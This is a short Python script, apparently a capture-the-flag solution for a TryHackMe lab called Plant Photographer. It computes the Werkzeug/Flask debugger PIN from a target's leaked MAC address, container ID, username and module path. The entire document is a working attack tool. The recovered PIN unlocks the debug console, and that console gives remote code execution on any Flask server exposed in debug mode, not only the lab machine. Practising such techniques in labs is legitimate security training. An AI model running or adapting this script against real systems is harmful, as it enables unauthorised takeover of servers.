# YouTube video walk through: https://youtu.be/OJ2xTTdmNSk
# TryHackMe room Plant Photographer https://tryhackme.com/room/plantphotographer
# script by Claudi

import hashlib
from itertools import chain

mac = 'REPLACE_WITH_MAC_ADDRESS'
mac_int = str(int(mac.replace(':', ''), 16))  # 2485378261250

# ONLY the container ID from first line of cgroup after /docker/
machine_id = 'REPLACE_WITH_MACHINE_ID'

probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    mac_int,
    machine_id
]

h = hashlib.md5()   # md5 not sha1!
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
        rv = '-'.join(
            num[x:x + group_size].rjust(group_size, '0')
            for x in range(0, len(num), group_size)
        )
        break

print('PIN:', rv)
